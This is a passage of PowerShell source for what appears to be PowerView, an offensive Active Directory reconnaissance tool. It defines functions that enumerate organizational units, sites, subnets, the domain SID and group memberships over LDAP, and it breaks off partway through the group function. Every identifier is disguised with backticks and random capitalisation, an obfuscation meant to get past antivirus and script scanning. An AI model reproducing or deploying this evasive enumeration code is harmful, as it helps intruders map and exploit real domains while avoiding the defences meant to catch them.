        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`DApFiL`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRO`pe`RTiEs},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`earChb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SEr`V`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${seArChS`c`opE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`suLTpageSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eR`VertIME`LIm`iT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${s`e`CUri`TY`masks},

        [Switch]
        ${TOMB`ST`one},

        [Alias('ReturnOne')]
        [Switch]
        ${Fin`d`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEdEn`Ti`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${Sea`RChEr`ARGum`ENts} = @{}
        if (${P`S`BoUndPA`Ra`MeT`Ers}['Domain']) { ${SEaRcHE`Ra`RGum`e`NTS}['Domain'] = ${DOM`Ain} }
        if (${pS`B`OUn`DpARAmeTERs}['Properties']) { ${SearChER`ArG`U`mEnTs}['Properties'] = ${PROP`E`Rti`Es} }
        if (${pS`B`oU`Ndpa`RaMEters}['SearchBase']) { ${se`ArChErar`g`UmE`NtS}['SearchBase'] = ${search`Ba`Se} }
        if (${pSB`oUn`DPAraMET`ERs}['Server']) { ${Se`Archer`A`RGUmEnTS}['Server'] = ${S`ER`VeR} }
        if (${ps`B`OuN`DPARa`meTE`Rs}['SearchScope']) { ${SEARc`heRa`R`GU`Me`NTs}['SearchScope'] = ${sEa`RChS`co`Pe} }
        if (${P`SBOuNdpARAM`EtE`RS}['ResultPageSize']) { ${s`eArcHERARg`U`m`EN`Ts}['ResultPageSize'] = ${RES`ULt`paGeS`ize} }
        if (${pS`B`OUnDparaM`EteRS}['ServerTimeLimit']) { ${SEarc`heRar`g`UM`ENTS}['ServerTimeLimit'] = ${se`RV`Erti`MeLiM`iT} }
        if (${PSboUndp`A`RAM`eTeRS}['SecurityMasks']) { ${S`Ea`RCher`ArguMeNts}['SecurityMasks'] = ${SECurI`TY`ma`skS} }
        if (${PSBO`UnDPa`RA`METeRS}['Tombstone']) { ${s`earChERAr`GuM`EnTS}['Tombstone'] = ${T`ombS`T`One} }
        if (${psBo`UnDP`ArAMete`RS}['Credential']) { ${SeA`RChERaRg`U`ME`Nts}['Credential'] = ${c`R`E`dEnTIAl} }
        ${OUSEaR`C`HER} = geT-doMaInse`A`RC`H`er @SearcherArguments
    }

    PROCESS {
        if (${o`Use`ARCHEr}) {
            ${idEnT`I`T`YfiLTeR} = ''
            ${F`I`LTer} = ''
            ${idE`N`TIty} | wher`e-O`Bject {${_}} | F`OreAcH-O`BJE`cT {
                ${Ide`Nt`iTyINsT`AN`Ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${iD`eN`TITyI`N`STA`NCE} -match '^OU=.*') {
                    ${ID`E`NTITY`FiLtER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsbOuNdpa`Ra`mEt`e`Rs}['Domain']) -and (-not ${PSBOUnD`P`ARAme`TERs}['SearchBase'])) {
                        
                        
                        ${IDeN`T`ITyd`OmAIn} = ${I`deN`TI`T`yInsT`AnCE}.SubString(${Ide`NtiTYIn`S`T`ANce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        w`Rite-`VeR`BoSE "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${sEArch`eR`ARgUmEn`TS}['Domain'] = ${ID`enT`Ity`d`OMaIn}
                        ${Ou`s`ear`ChEr} = G`et`-DomaIN`se`Arc`heR @SearcherArguments
                        if (-not ${oUS`Ea`Rcher}) {
                            w`R`I`Te-warNING "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${GUIDB`yTest`RInG} = (-Join (([Guid]${I`d`ent`iTy`INSTANce}).ToByteArray() | FoRE`A`cH-`obj`ECt {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${I`d`EntIty`FilT`eR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iD`E`N`TItyFiL`Ter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${I`DenTitYfi`l`T`ER} -and (${I`DeNtityfi`l`T`er}.Trim() -ne '') ) {
                ${f`ILt`Er} += "(|$IdentityFilter)"
            }

            if (${pSBo`UND`p`ARamEtERS}['GPLink']) {
                W`R`ITE`-VERb`OsE "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                ${FI`lt`Er} += "(gplink=*$GPLink*)"
            }

            if (${PSbouND`par`AM`EtERS}['LDAPFilter']) {
                WrI`T`e-v`eRb`oSe "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                ${f`iLtEr} += "$LDAPFilter"
            }

            ${O`USeAR`ch`er}.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            wrIT`e`-VeRBose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if (${p`SB`OunDpa`RAmETerS}['FindOne']) { ${re`su`ltS} = ${Ou`s`e`ARcheR}.FindOne() }
            else { ${R`Esul`TS} = ${o`Us`EArchEr}.FindAll() }
            ${REs`UltS} | WhER`e-oBj`E`Ct {${_}} | Fo`ReaCh`-o`Bj`eCt {
                if (${p`s`Bo`UN`dparaMET`eRS}['Raw']) {
                    
                    ${OU} = ${_}
                }
                else {
                    ${oU} = conVeR`T-`LDAPPRO`pe`RTY -Properties ${_}.Properties
                }
                ${Ou}.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                ${O`U}
            }
            if (${ReS`ULtS}) {
                try { ${R`esuL`Ts}.dispose() }
                catch {
                    wR`iTE-VE`Rbo`Se "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            ${O`UseaRc`h`Er}.dispose()
        }
    }
}


function g`eT-dOM`AI`NsITE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('Name')]
        [String[]]
        ${IDE`NtItY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${G`pLiNk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMAIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDa`pFIl`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RoPERti`ES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SE`ArCH`B`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sER`V`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`ea`RCHs`Cope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${resu`lt`p`AgEs`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVE`RTIM`e`LIm`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${sE`CURitYm`ASkS},

        [Switch]
        ${TOM`BS`TONe},

        [Alias('ReturnOne')]
        [Switch]
        ${fIN`D`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DeN`TIAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${S`e`A`R`CHeRArgumEn`Ts} = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if (${PsbOu`NDpa`Ra`meTers}['Domain']) { ${sEaRCheraR`gu`M`E`N`Ts}['Domain'] = ${dO`mA`In} }
        if (${pSbo`Un`dp`ARameTERs}['Properties']) { ${sEArC`H`ERA`R`guMe`NTS}['Properties'] = ${PRO`pERt`IeS} }
        if (${Psbo`UN`d`PaR`A`MeTErs}['SearchBase']) { ${SeA`RCherAR`gUme`Nts}['SearchBase'] = ${s`eAR`chb`AsE} }
        if (${PSBOu`NDp`Ara`M`et`ERS}['Server']) { ${s`E`ArCHERaRgU`meNtS}['Server'] = ${se`R`VeR} }
        if (${PS`BO`Und`pA`RameT`ERs}['SearchScope']) { ${SEa`Rc`hE`Rarg`U`mEnTS}['SearchScope'] = ${SeAR`C`HsCo`pe} }
        if (${PSb`O`UN`DPARaMET`ERs}['ResultPageSize']) { ${sEAr`C`Hera`Rg`UMentS}['ResultPageSize'] = ${r`E`SultpAge`siZe} }
        if (${P`s`BouNdpArA`M`eteRS}['ServerTimeLimit']) { ${se`ARC`he`R`ArGUMeNtS}['ServerTimeLimit'] = ${SErveRt`IM`EL`IMIt} }
        if (${pSbo`U`NDpa`R`A`MeteRS}['SecurityMasks']) { ${se`A`RCh`e`RARgumE`NtS}['SecurityMasks'] = ${secu`Rit`yMa`s`KS} }
        if (${PSBOu`ND`P`AraME`T`ERs}['Tombstone']) { ${S`eaR`CHErargUM`enTS}['Tombstone'] = ${Tom`Bsto`NE} }
        if (${psbOuNd`pAR`AMe`Ters}['Credential']) { ${sE`A`RchERArGU`Me`NTs}['Credential'] = ${C`REd`eNtiAl} }
        ${sitESea`RcH`er} = gEt-doMain`Se`A`Rc`HEr @SearcherArguments
    }

    PROCESS {
        if (${si`T`e`SeaRchER}) {
            ${idE`Nt`IT`y`FiltEr} = ''
            ${fIL`T`ER} = ''
            ${Id`e`NTI`TY} | wHE`Re`-OBje`Ct {${_}} | foreAc`h-O`B`JEct {
                ${i`DENt`It`y`INstAnCe} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${I`DEntITyiNs`T`A`NCE} -match '^CN=.*') {
                    ${I`dENtI`TYf`ilTER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${ps`Bo`UNdpARa`MEteRs}['Domain']) -and (-not ${PS`Bou`NDParA`MEtE`Rs}['SearchBase'])) {
                        
                        
                        ${IdeN`T`ItY`DomA`in} = ${I`deNtITyiN`s`TAncE}.SubString(${i`D`eN`T`IT`YinsTaNce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        w`R`itE-vERB`OSe "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${sEARCHE`RA`RG`UM`eNTS}['Domain'] = ${i`d`EntITyDO`maIN}
                        ${SiTE`s`eAr`CHEr} = Get-DO`mA`inSE`ARCHeR @SearcherArguments
                        if (-not ${SiTeSeAr`C`Her}) {
                            WrITe-wA`R`N`INg "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${gUid`BYte`ST`RiNG} = (-Join (([Guid]${I`dEnti`TYIn`stANCE}).ToByteArray() | F`OREa`cH`-obJEcT {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${ID`EnT`iTy`F`Ilter} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${i`DE`NtItY`FIltER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ID`EnTI`T`yFilT`eR} -and (${iDe`Nt`I`TYfi`LTer}.Trim() -ne '') ) {
                ${F`I`lTeR} += "(|$IdentityFilter)"
            }

            if (${pS`Bou`NdparA`MeTERS}['GPLink']) {
                write-`VeR`BoSe "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                ${fIL`T`eR} += "(gplink=*$GPLink*)"
            }

            if (${p`s`B`oUndparaMEtERs}['LDAPFilter']) {
                wRItE-VER`B`O`SE "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                ${FIl`T`eR} += "$LDAPFilter"
            }

            ${sITese`ARcH`er}.filter = "(&(objectCategory=site)$Filter)"
            WRI`Te-VE`RbOse "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if (${PSBO`Undp`A`RaMeT`ERs}['FindOne']) { ${r`Es`ULTS} = ${s`iteSeARC`hEr}.FindAll() }
            else { ${re`SulTs} = ${SI`T`Es`earCHer}.FindAll() }
            ${R`EsuL`Ts} | w`He`RE-oBJE`CT {${_}} | foR`Ea`c`h-obJeCt {
                if (${psBOu`N`dPA`RaM`eTERS}['Raw']) {
                    
                    ${s`itE} = ${_}
                }
                else {
                    ${S`ITe} = cO`NVe`RT-ldA`pP`RoPeRty -Properties ${_}.Properties
                }
                ${SI`TE}.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                ${S`ITe}
            }
            if (${r`esul`Ts}) {
                try { ${rE`SUl`TS}.dispose() }
                catch {
                    WritE-v`Erb`O`se "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            ${s`i`TeSEarchER}.dispose()
        }
    }
}


function G`eT-`dOMai`NSUbNEt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('Name')]
        [String[]]
        ${I`dEN`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SItEN`A`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDAPfiL`T`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`OpER`T`ies},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`eaRchba`se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`ERveR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`Arch`Sc`ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`ULT`P`AGEsi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`Rv`ertiMEL`iMIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SECurI`Ty`Mas`kS},

        [Switch]
        ${tOmBst`o`Ne},

        [Alias('ReturnOne')]
        [Switch]
        ${f`in`dONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`eNt`I`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${sEA`R`CH`E`RARGUMENTS} = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if (${P`s`BOundPa`RAM`eTERS}['Domain']) { ${sEaRche`RA`R`gu`MENTS}['Domain'] = ${d`oma`IN} }
        if (${p`Sb`OU`Ndp`ArAMeTerS}['Properties']) { ${sEArCH`eR`A`RguMENTS}['Properties'] = ${PR`o`Pe`RtiES} }
        if (${psB`OUndpa`RA`mEtE`RS}['SearchBase']) { ${s`e`ArcherarGuMe`N`Ts}['SearchBase'] = ${Sea`Rc`hBA`SE} }
        if (${psb`oU`ND`Pa`RaMetE`RS}['Server']) { ${sE`Arc`H`eRarGU`mentS}['Server'] = ${serV`ER} }
        if (${Psb`oUNDPa`R`AmEtE`Rs}['SearchScope']) { ${SEaR`che`R`A`RGuMeNtS}['SearchScope'] = ${se`ARCHSc`OPE} }
        if (${p`SbOUnD`PArAM`ETeRS}['ResultPageSize']) { ${S`E`AR`chErA`RgumENTS}['ResultPageSize'] = ${Resul`T`paGE`SI`ze} }
        if (${PsBoUndPa`Ra`m`E`TE`Rs}['ServerTimeLimit']) { ${SEaR`C`hErA`RGu`Men`Ts}['ServerTimeLimit'] = ${S`Er`VertiMEliM`IT} }
        if (${P`S`BouNDPa`RaMETeRS}['SecurityMasks']) { ${sE`A`R`cHeRARgUME`NTs}['SecurityMasks'] = ${seC`URitY`Ma`s`kS} }
        if (${Ps`BOU`NDpAr`AMeTeRs}['Tombstone']) { ${sEArCh`ERa`RguME`NTS}['Tombstone'] = ${to`M`BS`TOne} }
        if (${psbOUN`dP`A`Ramet`ERs}['Credential']) { ${sea`R`ch`eraRguM`E`NTs}['Credential'] = ${Cr`Edent`IaL} }
        ${su`B`NEtSEAR`cHER} = gE`T-dOMa`iNsE`ArCheR @SearcherArguments
    }

    PROCESS {
        if (${SUb`Net`sE`Arch`Er}) {
            ${id`EnT`Ity`FilteR} = ''
            ${F`ilT`Er} = ''
            ${id`eNt`iTY} | wHERE-O`B`je`ct {${_}} | fORea`c`h-O`BJe`Ct {
                ${I`dENtItyin`s`TanCe} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${iD`entiTYI`NST`AncE} -match '^CN=.*') {
                    ${idEntIT`Yfi`lTER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsB`OuNDP`AR`AMET`E`RS}['Domain']) -and (-not ${pSbouN`dpa`RaMEtE`Rs}['SearchBase'])) {
                        
                        
                        ${i`d`ENTITYDoMain} = ${ide`NTityI`N`St`ANCe}.SubString(${I`d`Enti`TyiNStaN`cE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        w`Rite-VE`Rbo`se "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${seaR`cH`eRaRgumEN`Ts}['Domain'] = ${Id`e`Nt`ItydomA`iN}
                        ${sUBNETs`E`ARcHER} = GET`-d`OmaInse`A`RcHER @SearcherArguments
                        if (-not ${SuBN`eTsea`R`Cher}) {
                            wRit`E`-WARniNG "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${Gu`IDBY`TESTR`ING} = (-Join (([Guid]${IdENtITyINS`T`A`N`ce}).ToByteArray() | forEA`c`h-O`Bj`ecT {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${idENTit`Y`Fi`LT`er} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${i`DeNtI`TYFi`lTeR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ID`ENT`i`TYFilTEr} -and (${ideN`Tit`YfILT`er}.Trim() -ne '') ) {
                ${FIL`T`Er} += "(|$IdentityFilter)"
            }

            if (${PSBOuNDPAra`mE`T`ERs}['LDAPFilter']) {
                WrI`Te-`V`e`RBOSE "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                ${fi`LtER} += "$LDAPFilter"
            }

            ${su`BNEtsear`C`HeR}.filter = "(&(objectCategory=subnet)$Filter)"
            wrItE-ver`B`OSe "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if (${PSboU`ND`paRA`m`e`TErS}['FindOne']) { ${Res`UL`TS} = ${S`UBN`e`TseArCh`ER}.FindOne() }
            else { ${rES`UL`TS} = ${su`B`N`ETSeaRCH`eR}.FindAll() }
            ${RESU`l`Ts} | WHerE`-Ob`jeCt {${_}} | f`oR`EA`cH-ObJ`eCT {
                if (${PSBo`UNDp`ArAM`ETErs}['Raw']) {
                    
                    ${S`Ub`NEt} = ${_}
                }
                else {
                    ${su`BNet} = CONVERt-L`d`ApPROper`Ty -Properties ${_}.Properties
                }
                ${sU`B`NET}.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if (${pSbO`U`Ndpa`R`AmeteRS}['SiteName']) {
                    
                    
                    if (${su`BN`eT}.properties -and (${s`Ub`Net}.properties.siteobject -like "*$SiteName*")) {
                        ${s`UbN`Et}
                    }
                    elseif (${SU`BN`Et}.siteobject -like "*$SiteName*") {
                        ${Subn`eT}
                    }
                }
                else {
                    ${su`Bnet}
                }
            }
            if (${R`Esu`lTs}) {
                try { ${r`Esul`TS}.dispose() }
                catch {
                    WRITE`-`VErbO`SE "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            ${S`UBn`etseAR`ch`er}.dispose()
        }
    }
}


function GEt`-DoM`A`INSId {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`eRVEr},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdenT`i`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`Sl},

        [Switch]
        ${O`BfUsCa`Te}
    )

    ${S`e`AR`chERA`Rg`UmEnts} = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if (${P`SbOUn`d`pA`RAmETErs}['Domain']) { ${sE`ArC`He`Rargu`MEnts}['Domain'] = ${D`OMAiN} }
    if (${ps`BOU`N`DPA`RAmetERS}['Server']) { ${S`e`A`RC`hEraRGUme`NTs}['Server'] = ${Se`RVeR} }
    if (${P`sboUnD`PAR`Am`etERS}['Credential']) { ${S`Ear`cHerargum`E`NTS}['Credential'] = ${cR`EdEnT`iAl} }
    if (${ps`BOU`N`Dpa`RAMETErS}['SSL']) { ${S`ea`R`C`HERaRG`UMentS}['SSL'] = ${s`sl} }
    if (${p`SbOuN`dPArAm`E`TErs}['Obfuscate']) {${se`AR`cHer`Ar`G`UMeNTS}['Obfuscate'] = ${oB`FU`ScatE} }

    ${dc`S`Id} = GEt-DOMAI`NcOm`put`ER @SearcherArguments -FindOne | selEC`T-obJE`CT -First 1 -ExpandProperty O`BJ`eCTsID

    if (${DC`Sid}) {
        ${D`C`Sid}.SubString(0, ${d`cS`ID}.LastIndexOf('-'))
    }
    else {
        Wr`itE-VE`RBOSE "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function GET-D`OmaInGr`ouP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUe}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${idE`Nt`Ity},

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${MEM`BE`RidenTI`TY},

        [Switch]
        ${ad`m`iNcOUNt},

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${gr`O`UpSCope},

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${G`R`ouPpro`PeR`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`dapfILT`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ProP`ER`TiES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`E`ARCHBASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sER`VeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sea`R`cHsCOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUL`T`pAG`E`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERV`E`RTIM`EL`imIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SeCU`R`ItY`maskS},

        [Switch]
        ${To`Mbsto`NE},

        [Alias('ReturnOne')]
        [Switch]
        ${f`indo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`DeN`TI`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`AW},

        [Switch]
        ${S`Sl},

        [Switch]
        ${O`BfU`SCate}
    )

    BEGIN {
        ${S`Ea`RChErArGu`mentS} = @{}
        if (${p`sb`ou`NDPARamete`Rs}['Domain']) { ${s`eaR`CHer`ArgU`MeNts}['Domain'] = ${dom`A`in} }
        if (${PS`BOUNdpaRAM`Et`e`Rs}['Properties']) { ${se`A`RCHEr`ARgUme`Nts}['Properties'] = ${PR`O`PERT`iES} }
        if (${ps`BouND`pa`RAMeT`ERS}['SearchBase']) { ${SEarCH`eRaR`g`UM`e`NTs}['SearchBase'] = ${SeaRC`H`BaSe} }
        if (${p`sbO`Und`Pa`RAMeterS}['Server']) { ${SEA`R`chERarGu`MEN`TS}['Server'] = ${S`e`RvER} }
        if (${PsbOUNDpARa`Met`E`Rs}['SearchScope']) { ${Se`ARchERA`R`Guments}['SearchScope'] = ${S`EArCh`s`cope} }
        if (${psb`O`UNd`PARA`MetERS}['ResultPageSize']) { ${s`eArc`HE`RAr`GuME`NTS}['ResultPageSize'] = ${ReSul`TPAgES`i`Ze} }
        if (${Ps`BOU`N`d`PARAmETErS}['ServerTimeLimit']) { ${seArC`Her`AR`Gu`mENTS}['ServerTimeLimit'] = ${SeRvE`R`TIm`ElIM`IT} }
        if (${PSBO`U`N`dpAra`meTers}['SecurityMasks']) { ${SeaRC`HERa`RG`UMENtS}['SecurityMasks'] = ${sEC`UritYM`A`S`KS} }
        if (${PsbOu`ND`ParAm`EtE`RS}['Tombstone']) { ${sEARc`HErarg`UMe`NTs}['Tombstone'] = ${t`O`MbsTONE} }
        if (${P`SbO`UN`dPArameTERs}['Credential']) { ${SeaRc`HEr`AR`gUm`En`TS}['Credential'] = ${C`RED`e`NTIAl} }
        if (${psBOunDp`ARam`Ete`Rs}['SSL']) { ${S`EArCH`ErArg`UMEn`Ts}['SSL'] = ${S`sl} }
        if (${ps`BOUNDPara`M`ETErs}['Obfuscate']) {${SEaRc`H`ErArgumE`Nts}['Obfuscate'] = ${ObFUS`c`ATe} }
    }

    PROCESS {
        if (${p`SBou`NdPAr`Ame`TErs}['MemberIdentity']) {

            if (${SeAr`ch`e`RARgU`MenTS}['Properties']) {
                ${OLDPrO`p`erti`eS} = ${sE`ARcHe`RArgume`N`Ts}['Properties']
            }

            ${sEA`RcHE`RaRguME`NTS}['Identity'] = ${MEM`BE`RIdEnT`i`Ty}
            ${SEA`RCHER`ARG`UmE`NTS}['Raw'] = ${t`RuE}

            get`-DoM`Ain`oBJEct @SearcherArguments | foReaC`H-`OBJE`CT {
                
                ${Ob`jECTdi`R`eC`T`OrYENtRY} = ${_}.GetDirectoryEntry()

                
                ${o`B`JeCT`DI`Rect`O`RYenTrY}.RefreshCache('tokenGroups')

                ${oBJeCTd`Ir`EctO`RY`e`NtRY}.TokenGroups | fO`RE`A`ch-OBjeCT {
                    
                    ${G`ROUP`S`Id} = (NE`w`-OBjeCT s`y`sTE`M.SEc`U`RIt`Y.pRI`NciPal`.`Se`cur`ItyiDeNTiFIer(${_},0)).Value

                    
                    if (${g`R`ouPsID} -notmatch '^S-1-5-32-.*') {
                        ${sEAR`CHEr`A`RGu`ments}['Identity'] = ${grOu`p`S`id}
                        ${s`EaRCHeRaR`gU`MeNTS}['Raw'] = ${FAL`se}
                        if (${o`lD`PRo`PErti`Es}) { ${SEaR`cHERaRg`Um`ents}['Properties'] = ${OlD`p`RopE`RtiEs} }
                        ${g`Ro`Up} = gET-d`oma`Inobj`e`ct @SearcherArguments
                        if (${g`ROUp}) {
                            ${Gr`O`Up}.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                            ${g`R`OUP}
                        }
                    }
                }
            }
        }
        else {
            ${IDEn`T`it`Yfi`LtEr} = ''
            ${fiL`T`eR} = ''
            ${IDe`NtI`Ty} | w`HeRE-`O`BJecT {${_}} | foRea`c`h-obJ`ECt {
                ${i`DE`NTItY`i`NStAnCe} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${I`DEnti`TYi`NstaNce} -match '^S-1-') {
                    ${IdeNt`ITyfiL`T`er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdEnti`TYInsT`AN`CE} -match '^CN=') {
                    ${i`deNT`I`TYFILteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSb`O`UNdPARa`ME`TeRS}['Domain']) -and (-not ${ps`BO`UnDPA`Ra`meTeRS}['SearchBase'])) {
                        
                        
                        ${ID`EnT`ItYDOmA`IN} = ${iDe`Nti`T`YInsTan`cE}.SubString(${ID`Entity`in`S`Tan`ce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        WRi`Te-`V`Erbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${SEa`RCheRA`R`g`UmENtS}['Domain'] = ${Ide`N`Ti`TYdom`AIn}
                        ${GRouPS`EAr`cH`Er} = Get`-d`OMAInSeArc`hEr @SearcherArguments
                        if (-not ${gR`OuPsEA`RCHeR}) {
                            wrI`TE-W`ArninG "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${IDen`Tity`iN`ST`AN`cE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${guIdB`yT`e`stRing} = (([Guid]${IDENTI`TYi`N`s`T`AnCe}).ToByteArray() | fO`REA`ch-o`BJect { '\' + ${_}.ToString('X2') }) -join ''
